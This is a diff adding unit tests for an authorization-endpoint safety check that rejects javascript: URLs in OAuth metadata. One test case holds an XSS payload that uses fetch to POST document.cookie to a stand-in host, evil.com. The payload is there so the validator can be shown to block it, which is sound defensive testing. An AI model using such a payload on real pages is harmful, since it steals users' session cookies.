@@ -1,4 +1,4 @@
-import { resourceUrlFromServerUrl, checkResourceAllowed } from './auth-utils.js';
+import { resourceUrlFromServerUrl, checkResourceAllowed, isAuthorizationEndpointSafe } from './auth-utils.js';
 
 describe('auth-utils', () => {
   describe('resourceUrlFromServerUrl', () => {
@@ -56,6 +56,23 @@ describe('auth-utils', () => {
     it('should handle trailing slashes vs no trailing slashes', () => {
       expect(checkResourceAllowed({ requestedResource: 'https://example.com/mcp/', configuredResource: 'https://example.com/mcp' })).toBe(true);
       expect(checkResourceAllowed({ requestedResource: 'https://example.com/folder', configuredResource: 'https://example.com/folder/' })).toBe(false);
+    });
+  });
+
+  describe('isAuthorizationEndpointSafe', () => {
+    it('should allow safe authorization endpoints', () => {
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'https://auth.example.com/authorize' })).toBe(true);
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'https://auth.example.com/auth' })).toBe(true);
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'https://auth.example.com/tenant1/authorize' })).toBe(true);
+    });
+
+    it('should block javascript: authorization endpoints', () => {
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'javascript:alert("XSS")' })).toBe(false);
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'javascript:fetch("https://evil.com/steal",{method:"POST",body:document.cookie})' })).toBe(false);
+    });
+
+    it('should pass through for invalid URLs', () => {
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'invalid-url' })).toBe(true);
     });
   });
 });
